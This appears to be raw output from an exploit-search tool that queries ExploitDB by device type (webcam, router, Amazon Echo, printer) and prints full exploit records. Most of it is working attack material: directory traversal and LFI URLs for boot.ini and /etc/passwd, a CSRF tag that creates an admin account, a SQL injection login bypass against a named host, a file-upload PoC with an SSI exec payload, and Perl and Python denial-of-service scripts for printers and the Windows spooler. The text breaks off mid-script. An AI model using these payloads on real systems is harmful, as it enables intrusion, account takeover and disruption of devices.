device search
=================================================================================
Searching for webcam
=================================================================================
exploit search
=================================================================================
dos
=================================================================================
Exploits found: 3
CVE: []
Description: Yahoo! Messenger 8.1.0.413 - 'webcam' Remote Crash
{u'code': u'Yahoo! Messenger 8.1.0.413 (webcam) Remote Crash Exploit\r\n\r\n1.compile the dll.\r\n2. choose "invite to view my webcam" to a contact id who is online using yahoo! messenger.\r\n3.when the otherside accept the invatation , inject the dll to local yahoo! messenger 8.1.0.413 \'s process.\r\n4 . the otherside\'s yahoo! messenger will be crashed.\r\n\r\nExploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/4335.rar (08292007-expyahoo.rar)\r\n\r\n# milw0rm.com [2007-08-29]', u'description': u"Yahoo! Messenger 8.1.0.413 - 'webcam' Remote Crash", u'platform': u'windows', u'author': u'wushi', u'cve': [], u'source': u'ExploitDB', u'date': u'2007-08-29T00:00:00+00:00', u'_id': 4335, u'type': u'dos', u'port': 0}

CVE: []
Description: Fake Webcam 6.1 - Local Crash (PoC)
{u'code': u'#!/usr/bin/ruby\r\n#############################################################################\r\n# Title:\t\tFake Webcam v.6.1 Local Crash PoC\r\n# Impact: \t\tCrashes the process\r\n# Tested on: \tWindows XP SP1/SP2 EN\r\n# Target:  \t\tFake Webcam v.6.1\r\n# Download Link:\thttp://www.fakewebcam.com/Download/setup.exe\r\n# Author:\t\tAnastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com\r\n# Greetz: \t\toffsec team, inj3ct0r team\r\n#############################################################################\r\npath = "c:\\\\a.wmv" #wmv/avi/flv/mpeg/mp4\r\nf = open(path, "wb")\r\nf.write("\\x41" * 1000)\r\nf.close()', u'description': u'Fake Webcam 6.1 - Local Crash (PoC)', u'platform': u'windows', u'author': u'Anastasios Monachos', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-03-17T00:00:00+00:00', u'_id': 16996, u'type': u'dos', u'port': 0}

CVE: []
Description: BroadGun Software CamShot WebCam 2.5 - GET Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/905/info\r\n\r\nCamShot is a webserver designed to work in conjunction with computer video cameras. The software will crash, and possibly allow for execution of arbitrary code, if a GET request of more than 2000 bytes is received.\r\n\r\nDoS attack:\r\nGET [2000 chars] HTTP/1.1', u'description': u'BroadGun Software CamShot WebCam 2.5 - GET Buffer Overflow', u'platform': u'windows', u'author': u'Ussr Labs', u'cve': [], u'source': u'ExploitDB', u'date': u'1999-12-30T00:00:00+00:00', u'_id': 19702, u'type': u'dos', u'port': 0}

Searching for webcam
=================================================================================
exploit search
=================================================================================
local
=================================================================================
Unable to parse JSON response
Searching for webcam
=================================================================================
exploit search
=================================================================================
remote
=================================================================================
Unable to parse JSON response
Searching for webcam
=================================================================================
exploit search
=================================================================================
shellcode
=================================================================================
Unable to parse JSON response
Searching for webcam
=================================================================================
exploit search
=================================================================================
 webapps
=================================================================================
Exploits found: 5
CVE: []
Description: WebcamXP and webcam 7 - Directory Traversal
{u'code': u'# Exploit Title: WebcamXP and Webcam7 Directory Traversal Vulnerability\r\n# Google Dork: "powered by webcamxp" xhtml css\r\n# Google Dork: "powered by webcam 7"\r\n# Date: 2/22/2012\r\n# Author: Silent Dream\r\n# Software Link: http://dl.filekicker.com/send/file/230775-FQAC/wlite550.exe\r\n# Software Link: http://dl.filekicker.com/send/file/226161-G6BD/w7inst.exe\r\n# Version: WebcamXP 5.5.1.2, Webcam 7 v0.9.9.32\r\n# Tested on: Windows XP\r\n# Similar to CVE: 2008-5862 but uses backslashes instead of encoded forward slashes.\r\n\r\nhttp://ip:8080/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini', u'description': u'WebcamXP and webcam 7 - Directory Traversal', u'platform': u'windows', u'author': u'Silent_Dream', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-02-22T00:00:00+00:00', u'_id': 18510, u'type': u'webapps', u'port': 0}

CVE: []
Description: PHP Webcam Video Conference - Multiple Vulnerabilities
{u'code': u'# Exploit: PHP Webcam Video Conference - LFI/XSS\r\n# Date: 06/02/2014\r\n# Exploit Author: vinicius777\r\n# Contact: vinicius777 [AT] gmail / @vinicius777_\r\n# Vendor Homepage: http://www.videowhisper.com/\r\n# Software Link: http://sourceforge.net/projects/phpwebcamvideoconference\r\n# Solution: Upgrade from to the new version on videowhisper vendor homepage.\r\n\r\n\r\n\r\n\r\n[1] Local File Include - rtmp_login.php\r\n\r\nP0C: http://192.168.1.7/vc_php/rtmp_login.php?s=../../../../../etc/passwd\r\n\r\n[+] rtmp_rlogin.php\r\n\r\n$session = $_GET[\'s\']; \r\n\r\n$filename1 = "uploads/_sessions/$session"; \r\nif (file_exists($filename1)) \r\n{ \r\necho implode(\'\', file($filename1)); \r\n} \r\nelse \r\n{ \r\necho "VideoWhisper=1&login=0"; \r\n} \r\n?>\r\n\r\n\r\n[2] XSS Reflected \r\n\r\nP0C = http://192.168.1.7/vc_php/vc_logout.php?message=[XSS]', u'description': u'PHP Webcam Video Conference - Multiple Vulnerabilities', u'platform': u'php', u'author': u'vinicius777', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-02-06T00:00:00+00:00', u'_id': 31458, u'type': u'webapps', u'port': 80}

CVE: [u'CVE-2013-7204']
Description: Conceptronic Wireless Pan & Tilt Network Camera - Cross-Site Request Forgery
{u'code': u'**General Details**\r\n\r\nAffected Product: Conceptronic camera CIPCAMPTIWL\r\nTested Firmware: 21.37.2.49\r\nTested Web UI Firmware: 0.61.4.18\r\nAssigned CVE: CVE-2013-7204\r\nCVSSv2 Base Score: 5.8 (AV:N/AC:M/AU:N/C:P/I:P/A:N)\r\nVulnerability Type: Cross-Site Request Forgery [CWE-352]\r\nSolution Status: Not Fixed\r\nVendor Notification Timeline:\r\n    - 23/12/2013: Contacting with technical support through their web\r\nform http://www.conceptronic.net/supcon.php?action=init\r\n    - 23/12/2013: Contacting with general information email addres\r\n(info@conceptronic.net) to inform about the vulnerability and request\r\nsuitable security or technical contact to send the complete details of\r\nthe CSRF.\r\n    - 25/12/2013: Contacting with public twitter accounts\r\n@conceptronic and @conceptronic_es to request suitable security or\r\ntechnical contact to send the complete details of the CSRF.\r\n    - 28/12/2013: Recontacting the technical support.\r\n    - 28/12/2013: Recontacting general information address\r\ninfo@conceptronic.net.\r\n    - 02/01/2014: Trying to conntact with security@conceptronic.net y\r\nvulnerabilities@conceptronic.net but they are non existent addresses.\r\n    - 03/01/2014: Involve Inteco CERT in the notification proccess.\r\n    - 08/01/2014: Inteco confirms that there is still no response from\r\nConceptronic.\r\n\r\nNone of the comunication atempts with the vendor received a response,\r\nso I\'m publishing the advisory to warn users and confirm the\r\nvulnerability with you.\r\n\r\n**Vulnerabilitty details**\r\n\r\nThe CSRF is present in the CGI formulary used to create and modify\r\nusers of the web interface of the camera (/set_users.cgi). This CSRF\r\nwould allow a malicious attacker to create users in the camera web\r\ninterface (including administrator users) if he is able to lure the\r\nlegitimate administrator of the camera to visit a web controlled by\r\nthe attacker.\r\n\r\nAn example of the process to exploit this vulnerability:\r\n\r\n1- A webcam administrator is already logged in the camera web interface.\r\n\r\n2- A malicious user knows it and send a link to this administrator\r\npointing to a web controlled by this attacker\r\n(http://example.com/conceptronic_csrf.html). In this web, the attacker\r\nplaced an image with the following code:\r\n\r\n  <img alt="csrf image"\r\nsrc="http://<victim_camera_server>/set_users.cgi?next_url=rebootme.htm&user1=attacker&pwd1=attacker&pri1=2&user2=&pwd2=&pri2=0&user3=&pwd3=&pri3=0&user4=&pwd4=&pri4=0&user5=&pwd5=&pri5=0&user6=&pwd6=&pri6=0&user7=&pwd7=&pri7=0&user8=&pwd8=&pri8=0">\r\n\r\n3- The webcam administrator visit the link.\r\n\r\n4- The page http://example.com/test_csrf.html tries to load the image\r\nby making a GET request to the pointed URL, thus, making the\r\nlegitimate administrator to create a new user identified by "attacker"\r\nand password "attacker".\r\n\r\nA video was uploaded to youtube showing this behaviour:\r\n\r\nhttps://www.youtube.com/watch?v=URXEe_VRc74\r\n\r\nThis issue can be fixed by adding an additional step to the user\r\ncreation CGI, either requesting the administrator password again\r\nbefore creating/modifying any user or creating a hidden random token\r\nfor each form (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)\r\n\r\n-- \r\nFelipe Molina de la Torre', u'description': u'Conceptronic Wireless Pan & Tilt Network Camera - Cross-Site Request Forgery', u'platform': u'hardware', u'author': u'Felipe Molina', u'cve': [u'CVE-2013-7204'], u'source': u'ExploitDB', u'date': u'2014-01-14T00:00:00+00:00', u'_id': 30914, u'type': u'webapps', u'port': 80}

CVE: []
Description: Soitec SmartEnergy 1.4 - SCADA Login SQL Injection / Authentication Bypass
{u'code': u"\ufeff\r\nSoitec SmartEnergy 1.4 SCADA Login SQL Injection Authentication Bypass Exploit\r\n\r\n\r\nVendor: Soitec\r\nProduct web page: http://www.soitec.com\r\nAffected version: 1.4 and 1.3\r\n\r\nSummary: Soitec power plants are a profitable and ecological investment\r\nat the same time. Using Concentrix technology, Soitec offers a reliable,\r\nproven, cost-effective and bankable solution for energy generation in the\r\nsunniest regions of the world. The application shows how Concentrix technology\r\nworks on the major powerplants managed by Soitec around the world. You will\r\nbe able to see for each powerplant instantaneous production, current weather\r\ncondition, 3 day weather forecast, Powerplant webcam and Production data history.\r\n\r\nDesc: Soitec SmartEnergy web application suffers from an authentication bypass\r\nvulnerability using SQL Injection attack in the login script. The script fails\r\nto sanitize the 'login' POST parameter allowing the attacker to bypass the security\r\nmechanism and view sensitive information that can be further used in a social\r\nengineering attack.\r\n\r\nTested on: nginx/1.6.2\r\n\r\n\r\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\r\n                            @zeroscience\r\n\r\n\r\nVendor status:\r\n\r\n[16.11.2014] Vulnerability discovered.\r\n[02.12.2014] Vendor contacted.\r\n[08.12.2014] Vendor responds asking more details.\r\n[08.12.2014] Sent details to the vendor.\r\n[09.12.2014] Vendor confirms the vulnerability.\r\n[12.12.2014] Vendor applies fix to version 1.4.\r\n[14.12.2014] Coordinated public security advisory released.\r\n\r\n\r\nAdvisory ID: ZSL-2014-5216\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5216.php\r\n\r\n\r\n16.11.2014\r\n\r\n---\r\n\r\n\r\n\r\nPOST /scada/login HTTP/1.1\r\nHost: smartenergy.soitec.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://smartenergy.soitec.com/scada/login\r\nCookie: csrftoken=ygUcdD2i1hFxUM6WpYB9kmrWqFhlnSBY; _ga=GA1.2.658394151.1416124715; sessionid=ixi3w5s72yopc29t9ewrxwq15lzb7v1e\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 87\r\n\r\ncsrfmiddlewaretoken=ygUcdD2i1hFxUM6WpYB9kmrWqFhlnSBY&login=%27+or+1%3D1--&password=blah", u'description': u'Soitec SmartEnergy 1.4 - SCADA Login SQL Injection / Authentication Bypass', u'platform': u'windows', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-12-15T00:00:00+00:00', u'_id': 35529, u'type': u'webapps', u'port': 0}

CVE: []
Description: WordPress Plugin VideoWhisper Video Presentation 3.31.17 - Arbitrary File Upload
{u'code': u'Title: Remote file upload vulnerability in wordpress plugin videowhisper-video-presentation v3.31.17\r\nAuthor: Larry W. Cashdollar, @_larry0\r\nDate: 2015-03-29\r\nDownload Site: https://wordpress.org/plugins/videowhisper-video-presentation/\r\nVendor: http://www.videowhisper.com/\r\nVendor Notified: 2015-03-31 won\u2019t fix, http://www.videowhisper.com/tickets_view.php?t=10019545-1427810822\r\nVendor Contact: http://www.videowhisper.com/tickets_submit.php\r\nAdvisory: http://www.vapid.dhs.org/advisory.php?v=117\r\nDescription: from the site \r\n"VideoWhisper Video Consultation is a web based video communication solution designed for online video consultations, interactive live presentations, trainings, webinars, coaching and online collaboration with webcam support. Read more on WordPress Video Presentation plugin home page."\r\n\r\nVulnerability:\r\nFrom wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php Allows various remote unauthenticated file uploads, among the file types is html where the last 4 characters are only being checked in a file name to match which types are allowed. Because of this .shtml can be passed through and remote code execution if SSI is allowed. The code does not do any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site: .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps \r\nThe \r\nif (strstr($filename,\'.php\')) exit; \r\n\r\ncan be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml\r\n<?php \r\nif ($_GET["room"]) $room=$_GET["room"]; \r\nif ($_POST["room"]) $room=$_POST["room"]; \r\n$filename=$_FILES[\'vw_file\'][\'name\']; \r\ninclude_once("incsan.php"); \r\nsanV($room); \r\nif (!$room) exit; \r\nsanV($filename);\r\nif (!$filename) exit; \r\nif (strstr($filename,\'.php\')) exit; //do not allow uploads to other folders\r\nif ( strstr($room,"/") || strstr($room,"..") ) exit; \r\nif ( strstr($filename,"/") || strstr($filename,"..") ) exit; \r\n$destination="uploads/".$room."/\u201c; \r\nif ($_GET["slides"]) $destination .= "slides/\u201c; \r\n$ext=strtolower(substr($filename,-4)); $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps\u201d);\r\nif (in_array($ext,$allowed)) move_uploaded_file($_FILES[\'vw_file\'][\'tmp_name\'], $destination . $filename); \r\n?>loadstatus=1\r\nCVEID: TBD\r\nOSVDB: TBD\r\nExploit Code:\r\n  videowhis_poc.php \r\n        <?php\r\n    \r\n   $uploadfile="upexp.shtml";\r\n   $ch = \r\n   curl_init("http://target_site/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php");\r\n   curl_setopt($ch, CURLOPT_POST, true);\r\n   curl_setopt($ch, CURLOPT_POSTFIELDS,\r\n            array(\'vw_file\'=>"@$uploadfile",\'name\'=>\'upexp.shtml\',\'room\'=>\'.\'));\r\n   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n   $postResult = curl_exec($ch);\r\n   curl_close($ch);\r\n   print "$postResult";\r\n    \r\n   ?>\r\n    \r\n    \r\n   upexp.shtml\r\n    \r\n   <html>\r\n    \r\n   <!--#exec cmd="/usr/bin/date > /tmp/p" -->\r\n    \r\n   this is html\r\n   </html>\r\n    \r\n    \r\n   The executeable should be located in wordpress/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads', u'description': u'WordPress Plugin VideoWhisper Video Presentation 3.31.17 - Arbitrary File Upload', u'platform': u'php', u'author': u'Larry W. Cashdollar', u'cve': [], u'source': u'ExploitDB', u'date': u'2015-04-02T00:00:00+00:00', u'_id': 36617, u'type': u'webapps', u'port': 80}

Searching for router
=================================================================================
exploit search
=================================================================================
dos
=================================================================================
Unable to parse JSON response
Searching for router
=================================================================================
exploit search
=================================================================================
local
=================================================================================
Unable to parse JSON response
Searching for router
=================================================================================
exploit search
=================================================================================
remote
=================================================================================
Unable to parse JSON response
Searching for router
=================================================================================
exploit search
=================================================================================
shellcode
=================================================================================
Unable to parse JSON response
Searching for router
=================================================================================
exploit search
=================================================================================
 webapps
=================================================================================
Unable to parse JSON response
Searching for Amazon Echo
=================================================================================
exploit search
=================================================================================
dos
=================================================================================
Exploits found: 0
Searching for Amazon Echo
=================================================================================
exploit search
=================================================================================
local
=================================================================================
Unable to parse JSON response
Searching for Amazon Echo
=================================================================================
exploit search
=================================================================================
remote
=================================================================================
Unable to parse JSON response
Searching for Amazon Echo
=================================================================================
exploit search
=================================================================================
shellcode
=================================================================================
Unable to parse JSON response
Searching for Amazon Echo
=================================================================================
exploit search
=================================================================================
 webapps
=================================================================================
Unable to parse JSON response
Searching for printer
=================================================================================
exploit search
=================================================================================
dos
=================================================================================
Exploits found: 28
CVE: []
Description: OCE 3121/3122 Printer - 'parser.exe' Denial of Service
{u'code': u'#!/usr/bin/perl\r\n#\r\n#OCE 3121/3122 Printer DoS Exploit\r\n#----------------------------\r\n#By Herman Groeneveld aka sh4d0wman\r\n#trancelover75 [AT] gmail.com\r\n#\r\n#Description: the printer runs a webserver to provide various printing tasks from\r\n#java enabled browsers. Input is being filtered for bad characters.\r\n#However it is vulnerable to a long url request. This will either reboot or crash the device.\r\n#\r\n#On crash, the "system" led on the printer changes from green to orange. No further printing is done\r\n#until somebody resets the printer by flipping the powerswitch. E675 error displayed in printer display.\r\n#On reboot, printing resumes after the device has completed it\'s reboot cycle.\r\n#\r\n#Crash is hard to accomplish. Play with the buffer input size. 261 worked at my printer. \r\n#Values of 250/500/50000 are known to reboot the printer. No reliable size for crashing yet.\r\n#\r\n#Loop this exploit and printing will be nearly impossible. Tested: unhappy users. Not implemented. \r\n#\r\n#If you test this on your device, pls let me know the result. I had just 1 printer to test it at ;)\r\n#\r\n#Discovered: 29/03/2006\r\n#Target: tested against OCE 3121/3122 printer. \r\n#Vendor: www.oce.com (no response)\r\n\r\n\tuse IO::Socket;\r\n\r\n\tif (@ARGV != 3)\r\n\t{\r\n\tprint "                                        \t\t\t      \\n";\r\n\tprint "   \t#OCE 3121/3122 Printer DoS Exploit#  \t\t      \\n";\r\n\tprint "---------------------------------------------------------------\\n";\r\n\tprint " Usage: crashoce.pl <target ip> <target port> <request length> \\n";\r\n\tprint " Example: new.pl 127.0.0.1 80 250 \t\t              \\n";\r\n\tprint " Play with request length for reboot or crash effect. \t      \\n\\n";\r\n\tprint "      \t#Coded by sh4d0wman 31/03/2006#\t\t\t      \\n";\r\n\texit(1);\r\n\t}\t\r\n\r\n\t$targetip =$ARGV[0]; #user input, no much fun in attacking 127.0.0.1 is it?\r\n\t$targetport =$ARGV[1]; #user input since vendor might change this some day, unlikely though  :-)\r\n\t$reqlength = $ARGV[2]; #user input since different sizes give different results\r\n\r\n\tprint "[-] OCE 3122 Printer DoS Exploit\\n\\n";\r\n\tprint "[-] Target IP: ";\r\n\tprint $targetip;\r\n\tprint "\\n[-] Connecting to target IP...\\n";\r\n\r\n$socket = IO::Socket::INET->new(\r\n\tProto => "tcp",\r\n\tPeerAddr => "$targetip",\r\n\tPeerPort => "$targetport"); unless ($socket) { die "- Could not connect. Check IP & \t\tport. Hint: default port is 80!\\n"}\r\n\r\nprint "[-] Connected to printer\\n\\n";\r\n\r\nprint "[-] Creating DoS request...\\n";\r\n\r\n$bufa=\'A\'x$reqlength; #creating payload, length based on user input\r\n\r\nprint "[-] Sending request...\\n\\n";\r\n\r\nprint $socket "GET /parser.exe?".$bufa.".html"." HTTP/1.1\\r\\n\\r\\n";\r\n\tsleep 5; #Be advised! Printer reaction to exploit can take up to 30 sec. Pls, be patient...\r\n\r\nprint "[>]Attack completed! Printer in error state or rebooting.\\n";\r\nclose($socket);\r\n\r\n# milw0rm.com [2006-04-26]', u'description': u"OCE 3121/3122 Printer - 'parser.exe' Denial of Service", u'platform': u'hardware', u'author': u'sh4d0wman', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-04-26T00:00:00+00:00', u'_id': 1718, u'type': u'dos', u'port': 0}

CVE: [u'CVE-2010-0619']
Description: Lexmark Multiple Laser printers - Remote Stack Overflow
{u'code': u'#####################################################################################\r\n\r\nApplication:   Lexmark Multiple Laser printer Remote Stack Overflow\r\n\r\nPlatforms:   Lexmark Multiple Laser printer      \r\n\r\nExploitation:   Remote Exploitable    \r\n\r\nCVE Number:   CVE-2010-0619\r\n\r\nDiscover Date:   2010-01-06\r\n\r\nAuthor:   Francis Provencher (Protek Research Lab\'s)\r\n\r\nWebsite:   http://www.protekresearchlab.com    \r\n\r\n\r\n#####################################################################################\r\n\r\n1) Introduction\r\n2) Report Timeline\r\n3) Technical details\r\n4) Products affected\r\n5) The Code\r\n\r\n\r\n#####################################################################################\r\n\r\n=================\r\n1) Introduction\r\n=================\r\n\r\nLexmark specializes in printers and printer accessories. Its current range of products includes color and monochrome laser printers and inkjet printers, both of which may include scanners (including all-in-one devices with faxing and copying capabilities and photo printers), and dot matrix printers. Lexmark was one of the first companies to release wifi inkjet printers and the very first to release printers with a web-enabled touchscreen, coming in early September of 2009. They also offer a wide variety of laser printers with software solutions for more professional printing environments.\r\n\r\n(Wikipedia)\r\n#####################################################################################\r\n\r\n====================\r\n2) Report Timeline\r\n====================\r\n\r\n2010-01-06  Vendor Contacted\r\n2010-01-09  Vendor Response\r\n2010-01-09  Vendor request a PoC\r\n2010-01-10  PoC is sent to the vendor\r\n2010-01-12  Vendor confirme they received PoC\r\n2010-01-13  Vendor confirm the vulnerability \r\n2010-03-22  Public release of this advisory\r\n\r\n\r\n#####################################################################################\r\n\r\n======================\r\n3) Technical details\r\n======================\r\n\r\nMultiple Lexmark Laser Printers contain remote buffer overflow vulnerabilities in their PJL processing\r\nfunctionality. These vulnerabilities could lead to remote code execution on the printer without authentication. Device freezes when a specialy PLJ request is sent to the daemon with an invalid argument on PJL INQUIRE command.\r\n\r\n#####################################################################################\r\n\r\n=====================\r\n4) Product affected\r\n=====================\r\n\r\nThe list is too long, you can found information on the Lexmark web site;\r\n\r\nhttp://support.lexmark.com/alerts\r\n\r\n\r\n#####################################################################################\r\n\r\n=============\r\n5) The Code\r\n=============\r\n\r\n\r\n#!/usr/bin/perl -w\r\n# Found by Francis Provencher for Protek Research Lab\'s\r\n# {PRL} Lexmark Multiple Laser Printer Remote Buffer Overflow PoC\r\n#\r\n# This PoC will completly DoS the printer and all is services, Use it at your own risk.\r\n#\r\n\r\nuse IO::Socket;\r\nif (@ARGV < 1){\r\nexit\r\n}\r\n$ip = $ARGV[0];\r\n#open the socket\r\nmy $sock = new IO::Socket::INET (\r\nPeerAddr => $ip,\r\nPeerPort => \'9100\',\r\nProto => \'tcp\',\r\n);\r\n\r\n\r\n$sock or die "no socket :$!";\r\nsend($sock, "\\033%-12345X\\@PJL INQUIRE AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n",0);\r\n\r\n\r\n\r\nclose $sock;\r\n\r\n\r\n\r\n\r\n#####################################################################################\r\n(PRL-2010-01)', u'description': u'Lexmark Multiple Laser printers - Remote Stack Overflow', u'platform': u'hardware', u'author': u'Francis Provencher', u'cve': [u'CVE-2010-0619'], u'source': u'ExploitDB', u'date': u'2010-03-25T00:00:00+00:00', u'_id': 11880, u'type': u'dos', u'port': 0}

CVE: []
Description: SCO OpenServer 5.0.6 - lpadmin Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/2553/info\r\n\r\nSCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid \'bin\' executables used in printer administration and related tasks.\r\n\r\nThis includes lpadmin, a component used to manage and configure print destinations, devices and printer interface programs.\r\n\r\n\'lpadmin\' contains a locally exploitable buffer overflow condition present in the handling of command-line parameters.\r\n\r\nIf properly exploited, this can yield user \'bin\' privileges to the attacker. \r\n\r\n/opt/K/SCO/Unix/5.0.6Ga/usr/lib/lpadmin `perl -e \'print "A" x 7000\'`\r\n\r\nMemory fault - core dumped', u'description': u'SCO OpenServer 5.0.6 - lpadmin Buffer Overflow', u'platform': u'sco', u'author': u'Secure Network Operations', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-03-27T00:00:00+00:00', u'_id': 20735, u'type': u'dos', u'port': 0}

CVE: []
Description: Microsoft Windows - spoolss GetPrinterData() Remote Denial of Service
{u'code': u'#!/usr/bin/python\r\n# MS Windows spoolss GetPrinterData() 0day Memory Allocation Remote DoS Exploit\r\n# Bug discovered by h07 <h07@interia.pl>\r\n# Tested on Windows 2000 SP4 Polish + All Microsoft Security Bulletins\r\n# Example:\r\n#\r\n# C:\\>python spoolss_dos.py 192.168.0.2 512\r\n#\r\n# [*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit\r\n# [*] Coded by h07 <h07@interia.pl>\r\n# [*] Connecting to 192.168.0.2:445\r\n# [+] Connected\r\n# [+] The NETBIOS connection with the remote host timed out.\r\n# [+] 192.168.0.2: Out of memory\r\n# [+] Done\r\n#\r\n# Exploit --> GetPrinterData(handle, value, 1024 * 1024 * 512) --> MS_Windows\r\n# Spooler service(spoolsv.exe) memory usage: 512 MB\r\n##\r\n\r\nfrom impacket.structure import Structure\r\nfrom impacket.nmb import NetBIOSTimeout\r\nfrom impacket.dcerpc import transport\r\nfrom impacket import uuid\r\nfrom struct import pack\r\nfrom string import atoi\r\nfrom sys import argv\r\nfrom sys import exit\r\n\r\nprint "\\n[*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit"\r\nprint "[*] Coded by h07 <h07@interia.pl>"\r\n\r\nif(len(argv) < 3):\r\n   print "[*] Usage: %s <host> <memory_size(MB)>" % (argv[0])\r\n   print "[*] Sample: %s 192.168.0.1 512" % (argv[0])\r\n   exit()\r\n\r\nMB = 1024 * 1024\r\nhost = argv[1]\r\nmemory_size = MB * atoi(argv[2])\r\ninterface = (\'spoolss\', \'12345678-1234-abcd-ef00-0123456789ab\', \'1.0\')\r\n\r\nstringbinding = "ncacn_np:%(host)s[\\\\pipe\\\\%(pipe)s]"\r\nstringbinding %= {\r\n\'host\': host,\r\n\'pipe\': interface[0],\r\n}\r\n\r\nclass B1(Structure):\r\n   alignment = 4\r\n   structure = (\r\n       (\'id\', \'<L\'),\r\n       (\'max\', \'<L\'),\r\n       (\'offset\', \'<L=0\'),\r\n       (\'actual\', \'<L\'),\r\n       (\'str\', \'%s\'),\r\n   )\r\n\r\nclass B2(Structure):\r\n   alignment = 4\r\n   structure = (\r\n       (\'max\', \'<L\'),\r\n       (\'offset\', \'<L=0\'),\r\n       (\'actual\', \'<L\'),\r\n       (\'str\', \'%s\'),\r\n   )\r\n\r\nclass OpenPrinterEx(Structure):\r\n   alignment = 4\r\n   opnum = 69\r\n   structure = (\r\n       (\'printer\', \':\', B1),\r\n       (\'null\', \'<L=0\'),\r\n       (\'str\', \'<L=0\'),\r\n       (\'null2\', \'<L=0\'),\r\n       (\'access\', \'<L=0\'),\r\n       (\'level\', \'<L=1\'),\r\n       (\'id1\', \'<L=1\'),\r\n       (\'level2\', \'<L=10941724\'),\r\n       (\'size\', \'<L=28\'),\r\n       (\'id2\', \'<L=0x42424242\'),\r\n       (\'id3\', \'<L=0x43434343\'),\r\n       (\'build\', \'<L=2600\'),\r\n       (\'major\', \'<L=3\'),\r\n       (\'minor\', \'<L=0\'),\r\n       (\'processor\', \'<L=0xFFFFFFFF\'),\r\n       (\'client\', \':\', B2),\r\n       (\'user\', \':\', B2),\r\n   )\r\n\r\nclass GetPrinterData(Structure):\r\n   alignment = 4\r\n   opnum = 26\r\n   structure = (\r\n       (\'handle\', \'%s\'),\r\n       (\'value\', \':\', B2),\r\n       (\'offered\', \'<L\'),\r\n   )\r\n\r\ntrans = transport.DCERPCTransportFactory(stringbinding)\r\n\r\nprint "[*] Connecting to %s:445" % (host)\r\ntry:\r\n   trans.connect()\r\nexcept:\r\n   print "[-] Connect failed"\r\n   exit()\r\n\r\nprint "[+] Connected"\r\n\r\ndce = trans.DCERPC_class(trans)\r\ndce.bind(uuid.uuidtup_to_bin((interface[1], interface[2])))\r\n\r\nquery = OpenPrinterEx()\r\nprinter = "\\\\\\\\%s\\x00" % (host)\r\nquery[\'printer\'] = B1()\r\nquery[\'printer\'][\'id\'] = 0x41414141\r\nquery[\'printer\'][\'max\'] = len(printer)\r\nquery[\'printer\'][\'actual\'] = len(printer)\r\nquery[\'printer\'][\'str\'] = printer.encode(\'utf_16_le\')\r\n\r\nclient = 